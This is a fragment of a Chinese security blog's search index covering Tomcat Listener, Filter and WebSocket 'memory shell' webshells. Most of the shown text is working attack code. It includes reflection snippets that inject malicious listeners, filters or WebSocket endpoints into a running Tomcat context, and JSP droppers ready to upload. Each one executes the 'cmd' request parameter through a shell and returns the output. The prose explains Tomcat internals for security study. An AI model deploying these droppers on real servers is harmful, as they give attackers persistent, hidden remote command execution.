\u5f88\u7b80\u5355\uff0c\u901a\u8fc7\u53cd\u5c04\u5373\u53ef\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\u3002 \u5728\u7f16\u5199\u53cd\u5c04\u4ee3\u7801\u4e4b\u524d\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u53bb\u770b\u4e00\u4e0b\uff0c\u6211\u4eec\u600e\u6837\u624d\u80fd\u901a\u8fc7\u53cd\u5c04\"\u591f\u5230\"StandardContext\u7684addApplicationEventListener\u65b9\u6cd5\u3002 \u53ef\u4ee5\u76f4\u89c2\u7684\u770b\u5230\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7servletContext\u83b7\u5f97\u5b83\u7684context\u5c5e\u6027\uff08ApplicationContext\u5bf9\u8c61\uff09\uff0c\u7136\u540e\u901a\u8fc7ApplicationContext\u5bf9\u8c61\u7684context\u83b7\u5f97StandardContext\u5bf9\u8c61\uff0c\u7136\u540e\u8c03\u7528addApplicationEventListener\u65b9\u6cd5\u3002\u5f88\u597d\u3002 \u53cd\u5c04\u4ee3\u7801 ServletContext servletContext = this.getServletConfig().getServletContext(); Field field = servletContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext); field = applicationContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); standardContext.addApplicationEventListener(new MyListener(request,response)); //\u8fd9\u4e00\u884c\u662f\u5c06\u67d0\u4e2aListener\u7c7b\u6dfb\u52a0\u5230\u76d1\u542c\u5668 \u6076\u610fListener public class MyListenr implements ServletRequestListener { public ServletResponse response; public ServletRequest request; MyListenr(ServletRequest request, ServletResponse response) { this.request = request; this.response = response; } public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmder = request.getParameter(\"cmd\"); try { Process ps = Runtime.getRuntime().exec(cmder); BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while ((line = br.readLine()) != null) { //\u6267\u884c\u7ed3\u679c\u52a0\u4e0a\u56de\u8f66 sb.append(line).append(\"<br>\"); } String result = sb.toString(); this.response.getWriter().write(result); } catch (Exception e) { System.out.println(\"error \"); } } } \u5b9e\u9a8c\u4e00\u4e0b \u6211\u4eec\u5148\u8bbf\u95ee/a\u8def\u7531\uff0c\u8ba9\u4ee3\u7801\u88ab\u6267\u884c\u3002\u7136\u540e\u5230\u4efb\u610f\u9875\u9762\u4f20\u5165\u6076\u610f\u53c2\u6570 SUCCESS\u3002 \u4e3a\u4e86\u66f4\u65b9\u4fbf\u7684\u6ce8\u5165\u5185\u5b58\u9a6c\uff0c\u6211\u4ece\u7f51\u4e0a\u5ad6\u4e86\u4e00\u4e2aJSP\uff08Linux\u7248\uff09\u3002\u53ea\u8981\u6211\u4eec\u4e0a\u4f20\u8be5JSP\u7136\u540e\u8bbf\u95ee\u5b83\u4e00\u4e0b\uff0c\u5185\u5b58\u9a6c\u5c31\u88ab\u6ce8\u5165\u4e86\uff0c\u5341\u5206\u7684\u65b9\u4fbf\u3002 <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%> <%@ page import=\"org.apache.jasper.tagplugins.jstl.core.Out\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"javax.servlet.annotation.WebServlet\" %> <%@ page import=\"java.io.InputStreamReader\" %> <%@ page import=\"java.io.BufferedReader\" %> <% Object obj = request.getServletContext(); Field field = obj.getClass().getDeclaredField(\"context\"); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(obj); field = applicationContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); ListenH listenH = new ListenH(request, response); standardContext.addApplicationEventListener(listenH); out.print(\"test\"); %> <%! public class ListenH implements ServletRequestListener { public ServletResponse response; public ServletRequest request; ListenH(ServletRequest request, ServletResponse response) { this.request = request; this.response = response; } public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmder = request.getParameter(\"cmd\"); String[] cmd = new String[]{\"/bin/sh\", \"-c\", cmder}; try { Process ps = Runtime.getRuntime().exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while ((line = br.readLine()) != null) { //\u6267\u884c\u7ed3\u679c\u52a0\u4e0a\u56de\u8f66 sb.append(line).append(\"<br>\"); } String result = sb.toString(); this.response.getWriter().write(result); }catch (Exception e){ System.out.println(\"error \"); } } } %>","title":"\u7f16\u5199Listener\u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#filter","text":"http://wjlshare.com/archives/1529 Filter\u5185\u5b58\u9a6c\u4e0eListener\u5185\u5b58\u9a6c\u8fd8\u662f\u6709\u70b9\u533a\u522b\u7684\uff0c\u8981\u590d\u6742\u4e00\u70b9\u70b9","title":"Filter \u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#dofilter","text":"","title":"doFilter\u65b9\u6cd5\u5982\u4f55\u88ab\u6267\u884c\uff1f"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#filter_1","text":"\u518d\u5f00\u59cb\u5206\u6790Filter\u5185\u5b58\u9a6c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5148\u77e5\u9053\uff0cFilter\u7c7b\u4e2d\u7684doFilter\u65b9\u6cd5\u662f\u5982\u4f55\u88ab\u6267\u884c\u7684\u3002 OK\u6211\u4eec\u5148\u521b\u5efa\u597d\u4e00\u4e2aFilter\u3002 Filter\u7c7b\u4ee3\u7801 import javax.servlet.*; import java.io.IOException; public class MyFilter implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { System.out.println(\"Filter!\"); chain.doFilter(req,resp); } public void init(FilterConfig config) throws ServletException { } } maven <dependency> <groupId>javax.servlet</groupId> <artifactId>javax.servlet-api</artifactId> <version>3.0.1</version> <scope>provided</scope> </dependency> \u63a5\u4e0b\u6765\u5728web.xml\u4e2d\u6dfb\u52a0Filter\u3002 \u6211\u4eec\u5728doFilter\u65b9\u6cd5\u5904\u4e0b\u65ad\u70b9\uff0c\u8fd0\u884c\uff0c\u5f97\u5230\u8c03\u7528\u5e27\u5982\u4e0b","title":"\u914d\u7f6efilter"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#filterchain","text":"\u6211\u4eec\u4eceStandardWrapperValue#invoke \u5904\u5f00\u59cb\u5206\u6790. filterChain.doFilter(request.getRequest(), response.getResponse()); \u90a3\u4e48\u8fd9\u4e2afilterChain\u662f\u4ec0\u4e48\uff1f\u6211\u4eec\u8ddf\u8fdb\u4e00\u4e0b \u518d\u5ea6\u8ddf\u8fdb\u5230createFilterChain\u65b9\u6cd5\uff0c\u6765\u5230\u4e86ApplicationFilterFactory.java\u91cc\u3002 \u6bd4\u8f83\u5173\u952e\u7684\u4ee3\u7801\u662f\u8fd9\u91cc\u3002\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u904d\u5386FilterMaps\uff0c\u68c0\u6d4b\u6bcf\u4e2aFilterMap\u9879\u5bf9\u5e94\u7684\u90a3\u4e2aFilter\u4e0e\u8bf7\u6c42\u7684\u8def\u7531\u7b49\u662f\u5426\u4e00\u81f4\u3002\u82e5\u4e00\u81f4\u5219\u5c06\u4ee5\u8be5filter\u7684name\u4e3a\u53c2\u6570\u53bbFilterConfigs\u91cc\u53bb\u5bfb\u627e\u5bf9\u5e94\u7684FilterConfig,\u7136\u540e\u5c06\u8be5filterconfig\u653e\u5165filterchain\u4e2d\u3002\u4e0d\u4e00\u81f4\u7684\u5219\u629b\u5f03\u3002","title":"filterchain"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#filterconfigfilterdef","text":"\u90a3\u4e48filterconfig\u53c8\u662f\u4e2a\u4ec0\u4e48\u6837\u7684\u4e1c\u897f\u5462\uff1f \u6211\u4eec\u8ddf\u8fdbcontext.findFilterConfig,\u8fd9\u91cc\u7684context\u662fStandardContext\u3002 \u518d\u5ea6\u8ddf\u8fdbfilterconfigs\uff0c\u5c31\u53ef\u4ee5\u5f88\u660e\u663e\u7684\u53d1\u73b0filterconfigs\u662f\u4e00\u4e2ahashmap\u7ed3\u6784 \u952e\u4e3afilter\u540d\uff0c\u503c\u4e3afilterconfig \u90a3\u4e48filterconfig\u7684\u7ed3\u6784\u53c8\u662f\u5982\u4f55\u3002\u6211\u4eec\u8ddf\u8fdbApplicationFilterConfig\u7c7b\u3002\u4e0b\u56fe\u662f\u6b64\u7c7b\u7684\u6784\u9020\u51fd\u6570 \u5173\u952e\u5730\u65b9\u5708\u51fa\u6765\u4e86\u662f\u4e0efilterdef\u6709\u5173\u7684\u4ee3\u7801\u3002\u5728\u6784\u9020\u51fd\u6570\u7684\u65f6\u5019\u5c06\u4f20\u5165context\u548cfilterdef\uff0c\u7136\u540e\u518d\u901a\u8fc7\u5bf9filterdef\u8c03\u7528getfilter\u83b7\u5f97filter\u7c7b\uff08\u5373\u6211\u4eec\u81ea\u5df1\u5b9a\u4e49\u7684filter\u7c7b\uff09\u3002 \u6211\u4eec\u518d\u770b\u770bfilterDef\u7684\u5173\u952e\u4ee3\u7801 OKOK\uff0c\u4e0a\u9762\u5c31\u662fFilterConfig\uff0cFilterChain\u548cFilterDef\u7684\u4e00\u4e9b\u96f6\u788e\u7684\u4ecb\u7ecd\u3002 \u6211\u4eec\u5927\u81f4\u53ef\u4ee5\u5f97\u5230\u4e0b\u5217\u5173\u952e\u4fe1\u606f FilterConfigs \u662f\u4e00\u4e2aHashMap\u7ed3\u6784\uff0c\u952e\u4e3afilter\u540d\uff0c\u503c\u4e3afilterconfig filterconfig\u5305\u542b\u4e86filterdef filterdef\u76f4\u63a5\u4e0efilter\u7c7b\u76f8\u5173\u8054 StandardWrapperValue#invoke \u8fd9\u4e00\u5c42\u5206\u6790\u5b8c\u4e86\uff0c\u8fd9\u4e00\u5c42\u662f\u6700\u9ebb\u70e6\u7684\uff0c\u5411\u4e0b\u4e24\u5c42\u5c06\u4f1a\u4eb2\u5207\u5f88\u591a\u3002","title":"filterconfig\u4e0efilterdef"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#_2","text":"\u5411\u4e0b\u5206\u6790\u6765\u5230ApplicationFilterChain#doFilter.\u8fd9\u4e00\u5c42\u5f88\u7b80\u5355\uff0c\u8c03\u4e86\u4e2ainternalDofilter\u5c31\u6ca1\u4e86 \u518d\u5411\u4e0b\u5206\u6790\u6765\u5230ApplicationFilterChain#internalDoFilter\u3002 \u5173\u952e\u7684\u5730\u65b9\u5708\u51fa\u6765\u4e86\uff0c\u5927\u81f4\u5c31\u662f\u901a\u8fc7filterchain\u91cc\u7684filterconfig\u7684getFilter\u65b9\u6cd5\uff08\u4e0b\u56fe\u4e3agetFilter\u65b9\u6cd5\uff0c\u53ef\u4ee5\u660e\u663e\u770b\u5230\u662f\u8fd4\u56de\u4e86filter\uff09\u4ece\u800c\u83b7\u5f97filterdef\u91cc\u7684filter\uff0c\u4ece\u800c\u8c03\u7528filter\u7684dofilter\uff0c\u8fd9\u5c31\u662f\u5927\u6982\u7684\u6d41\u7a0b\u3002","title":"\u4e0b\u9762\u7684\u4e24\u5c42"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#_3","text":"\u6587\u5b57\u603b\u662f\u6709\u4e9b\u8d2b\u7620\u7684\uff0c\u7528\u56fe\u6765\u8bf4\u8bdd\u5c31\u4f1a\u660e\u4e86\u8bb8\u591a\u3002","title":"\u52a0\u8f7d\u8fc7\u7a0b\u6d41\u7a0b\u56fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#filterdef","text":"\u6211\u4eec\u5982\u4f55\u628aFilterDef\u4e0e\u6211\u4eec\u7684Filter\u5173\u8054\u8d77\u6765\u5e76\u6dfb\u52a0\u5230standardContext\u4e2d\u5462\uff1f\u8fd9\u4e2a\u95ee\u9898\u6bd4\u8f83\u5173\u952e\uff0c\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u5c06\u6211\u4eec\u7684FilterDef\u6ce8\u5165\u5230\u5185\u5b58\u624d\u80fd\u8ba9\u6211\u4eec\u7684Filter\u6709\u88ab\u8c03\u7528\u7684\u53ef\u80fd\u6027\u3002 \u5b9e\u9645\u4e0a\u5462\uff0c\u4e5f\u5f88\u7b80\u5355\u3002\u6d41\u7a0b\u4e0a\u6765\u8bf4\u4e0eListener\u5185\u5b58\u9a6c\u5dee\u4e0d\u591a \u6253\u65ad\u70b9 \u8ddf\u8fdb \u518d\u8ddf \u7ee7\u7eed\u8ddf \u6765\u5230\u6b64\u5904\uff0c\u4e0eListener\u5185\u5b58\u9a6c\u795e\u4f3c\u3002 if\u5224\u65ad\u91cc\u5224\u65ad\u4e86\u7a0b\u5e8f\u662f\u5426\u5728\u8fd0\u884c context\u662fstandardContext\uff0c\u8fd9\u91cc\u8c03\u7528\u4e86\u5b83\u7684addFilterDef\u6765\u6dfb\u52a0FilterDef\u3002","title":"FilterDef\u6dfb\u52a0"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#filter_2","text":"\u7528\u53cd\u5c04\uff0c\u539f\u56e0\u548cListener\u662f\u4e00\u6837\u7684\u3002 \u53cd\u5c04\u4ee3\u7801 try { response.getWriter().write(\"a\"); System.out.println(\"Servlet Get Message\\n\"); Object obj = request.getServletContext(); Field field = obj.getClass().getDeclaredField(\"context\"); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(obj); field = applicationContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); //\u83b7\u53d6standardContext FilterDef filterDef = new FilterDef(); filterDef.setFilter(new MyFilter()); filterDef.setFilterName(\"MyFilter\"); standardContext.addFilterDef(filterDef); //\u5c06FilterDef\u4e0efilter\u5173\u8054\uff0c\u6ce8\u5165\u5230\u5185\u5b58 field = standardContext.getClass().getDeclaredField(\"filterConfigs\"); field.setAccessible(true); HashMap filterConfigs = (HashMap) field.get(standardContext);//\u83b7\u53d6filterConfigs Constructor constructor = Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\"). getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); filterConfigs.put(\"MyFilter\",constructor.newInstance(standardContext,filterDef)); //\u5c06\u5305\u542bfilterDef\u7684filterConfig\u6dfb\u52a0\u5230filterConfigs FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\"/*\"); filterMap.setFilterName(\"MyFilter\"); standardContext.addFilterMapBefore(filterMap); //\u5c06\u8be5filterMap\u4e0efilterConfig\u8fdb\u884cNAME\u7ed1\u5b9a\u5e76\u653e\u5230filterMaps\u7684\u9996\u4f4d } catch (IOException | NoSuchFieldException | IllegalAccessException | ClassNotFoundException | NoSuchMethodException | InstantiationException | InvocationTargetException e) { e.printStackTrace(); } \u6728\u9a6c\u672c\u4f53 public class MyFilter implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { String cmder = req.getParameter(\"cmd\"); try { Process ps = Runtime.getRuntime().exec(cmder); BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while ((line = br.readLine()) != null) { //\u6267\u884c\u7ed3\u679c\u52a0\u4e0a\u56de\u8f66 sb.append(line).append(\"<br>\"); } String result = sb.toString(); resp.getWriter().write(result); }catch (Exception e){ System.out.println(\"error \"); } chain.doFilter(req,resp); } public void init(FilterConfig config) throws ServletException { } } \u7f51\u4e0a\u5ad6\u7684JSP <%@ page import=\"org.apache.catalina.core.StandardContext\" %> <%@ page import=\"org.apache.catalina.core.ApplicationContext\" %> <%@ page import=\"java.lang.reflect.Field\" %> <%@ page import=\"java.io.IOException\" %> <%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %> <%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %> <%@ page import=\"java.lang.reflect.Constructor\" %> <%@ page import=\"org.apache.catalina.Context\" %> <%@ page import=\"java.util.HashMap\" %> <%@ page import=\"java.io.BufferedReader\" %> <%@ page import=\"java.io.InputStreamReader\" %> <% Object obj = request.getServletContext(); Field field = obj.getClass().getDeclaredField(\"context\"); field.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) field.get(obj); field = applicationContext.getClass().getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(applicationContext); FilterDef filterDef = new FilterDef(); filterDef.setFilterName(\"testF\"); standardContext.addFilterDef(filterDef); // \u5728context\u4e2d\u6dfb\u52a0filterMap\u65f6\u4f1a\u53bb\u627e\u4e00\u4e0b\u662f\u5426\u5b58\u5728\u5bf9\u5e94\u7684filterdef Filter filter = new testF(); filterDef.setFilter(filter); // \u5c06\u6211\u4eec\u521b\u5efa\u7684filter\u4e0efilterdef\u76f8\u5173\u8054\u8d77\u6765 field = standardContext.getClass().getDeclaredField(\"filterConfigs\"); field.setAccessible(true); HashMap hashMap = (HashMap) field.get(standardContext); Constructor constructor = Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\").getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); hashMap.put(\"testF\",constructor.newInstance(standardContext,filterDef)); FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\"/*\"); filterMap.setFilterName(\"testF\"); standardContext.addFilterMapBefore(filterMap); System.out.println(\"filter ok !\"); %> <%! public class testF implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { String cmder = req.getParameter(\"cmd\"); String[] cmd = new String[]{\"/bin/sh\", \"-c\", cmder}; try { Process ps = Runtime.getRuntime().exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while ((line = br.readLine()) != null) { //\u6267\u884c\u7ed3\u679c\u52a0\u4e0a\u56de\u8f66 sb.append(line).append(\"<br>\"); } String result = sb.toString(); resp.getWriter().write(result); }catch (Exception e){ System.out.println(\"error \"); } chain.doFilter(req,resp); } public void init(FilterConfig config) throws ServletException { } } %>","title":"\u7f16\u5199Filter\u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#_4","text":"\u4e2a\u4eba\u611f\u89c9\u8fd9\u7bc7\u6587\u7ae0\u5199\u7684\u6bd4\u8f83\u4e71\uff0c\u7279\u522b\u662fFilter\u5185\u5b58\u9a6c\u3002 \u8fd9\u4e5f\u662f\u6211\u62d6\u4e863\u4e2a\u6708\u624d\u6765\u641e\u7684\u4e1c\u897f\uff0c\u8fd9\u5b66\u671f\u4e8b\u6709\u70b9\u591a\uff0c\u5f88\u591a\u4e4b\u524d\u60f3\u641e\u7684\u4e1c\u897f\u90fd\u6ca1\u817e\u51fa\u65f6\u95f4\u5f04\u3002 \u8fd9\u7bc7\u6587\u7ae0\u8bb2\u5230\u7684\u5185\u5b58\u9a6c\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u5b9e\u73b0\u5b8c\u5168\u7684\u65e0\u6587\u4ef6\u843d\u5730\uff0c\u4e2d\u95f4\u4f1a\u6709\u6076\u610fJSP\u6587\u4ef6\u843d\u5730\u3002\u66f4\u9ad8\u7ea7\u7684\u653b\u51fb\u5f62\u5f0f\u540e\u9762\u518d\u641e\u5427\u3002","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/tomcat%20Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#_5","text":"http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/ https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext http://wjlshare.com/archives/1529 https://blog.csdn.net/angry_program/article/details/116661899","title":"\u53c2\u8003"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/","text":"tomcat websocket\u5185\u5b58\u9a6c \u76ee\u5f55 addEndpoint \u6ce8\u5165\u5185\u5b58 \u6ce8\u91ca \u624b\u52a8\u5347\u7ea7-\u65e0\u9700\u6ce8\u5165 addEndpoint \u6ce8\u5165\u5185\u5b58 websocket\u5185\u5b58\u9a6c\u662f\u4e00\u4e2a\u6bd4\u8f83\u65b0\u7684\u5185\u5b58\u9a6c\uff0c\u5b83\u662f\u901a\u8fc7addEndpoint\u65b9\u6cd5\u88ab\u585e\u8fdb\u5185\u5b58\u4e2d\u7684\u3002\u6ce8\u8d77\u6765\u4e5f\u6bd4\u8f83\u7b80\u5355 \u6076\u610f\u7c7b\u53ef\u4ee5\u8fd9\u6837\u88ab\u690d\u5165\u5230\u5185\u5b58\u4e2d ServerContainer container = (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName()); ServerEndpointConfig config = ServerEndpointConfig.Builder.create(evil.class, \"/ws\").build(); container.addEndpoint(config); \u6076\u610f\u7c7b\u957f\u8fd9\u6837\uff0c\u8c03\u7528onmessage\u65b9\u6cd5\u8fdb\u884c\u6076\u610f\u64cd\u4f5c public static class C extends Endpoint implements MessageHandler.Whole<String> { private Session session; @Override public void onMessage(String s) { try { Process process; boolean bool = System.getProperty(\"os.name\").toLowerCase().startsWith(\"windows\"); if (bool) { process = Runtime.getRuntime().exec(new String[] { \"cmd.exe\", \"/c\", s }); } else { process = Runtime.getRuntime().exec(new String[] { \"/bin/bash\", \"-c\", s }); } InputStream inputStream = process.getInputStream(); StringBuilder stringBuilder = new StringBuilder(); int i; while ((i = inputStream.read()) != -1) stringBuilder.append((char)i); inputStream.close(); process.waitFor(); session.getBasicRemote().sendText(stringBuilder.toString()); } catch (Exception exception) { exception.printStackTrace(); } } @Override public void onOpen(final Session session, EndpointConfig config) { this.session = session; session.addMessageHandler(this); } } \u690d\u5165\u540e\u7684\u89e6\u53d1\u903b\u8f91 \u6ce8\u91ca \u4e5f\u53ef\u4ee5\u901a\u8fc7\u6ce8\u91ca\u6765\u6dfb\u52a0webscoket\u7aef\u70b9\uff0c\u4f46\u662f\u5b9e\u9645\u6e17\u900f\u4e2d\u6211\u4eec\u5f80\u5f80\u662f\u4f20jsp\uff0cjsp\u4e0d\u652f\u6301\u6ce8\u91ca\u3002 \u6240\u4ee5\u8fd9\u4e2a\u65b9\u6cd5\u4e86\u89e3\u4e00\u4e0b\u5373\u53ef\u3002 @ServerEndpoint(value = \"/websocket\") \u624b\u52a8\u5347\u7ea7-\u65e0\u9700\u6ce8\u5165 private void SetHeader(HttpServletRequest request, String key, String value){ Class<? extends HttpServletRequest> requestClass = request.getClass(); try { Field requestField = requestClass.getDeclaredField(\"request\"); requestField.setAccessible(true); Object requestObj = requestField.get(request); Field coyoteRequestField = requestObj.getClass().getDeclaredField(\"coyoteRequest\"); coyoteRequestField.setAccessible(true); Object coyoteRequestObj = coyoteRequestField.get(requestObj); Field headersField = coyoteRequestObj.getClass().getDeclaredField(\"headers\"); headersField.setAccessible(true); MimeHeaders headersObj = (MimeHeaders)headersField.get(coyoteRequestObj); headersObj.removeHeader(key); headersObj.addValue(key).setString(value); } catch (Exception e) { e.printStackTrace(); } } SetHeader(request,\"Connection\",\"upgrade\"); SetHeader(request,\"Sec-WebSocket-Version\",\"13\"); SetHeader(request,\"Upgrade\",\"websocket\");","title":"tomcat websocket\u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/#tomcat-websocket","text":"","title":"tomcat websocket\u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/#_1","text":"addEndpoint \u6ce8\u5165\u5185\u5b58 \u6ce8\u91ca \u624b\u52a8\u5347\u7ea7-\u65e0\u9700\u6ce8\u5165","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/#addendpoint","text":"websocket\u5185\u5b58\u9a6c\u662f\u4e00\u4e2a\u6bd4\u8f83\u65b0\u7684\u5185\u5b58\u9a6c\uff0c\u5b83\u662f\u901a\u8fc7addEndpoint\u65b9\u6cd5\u88ab\u585e\u8fdb\u5185\u5b58\u4e2d\u7684\u3002\u6ce8\u8d77\u6765\u4e5f\u6bd4\u8f83\u7b80\u5355 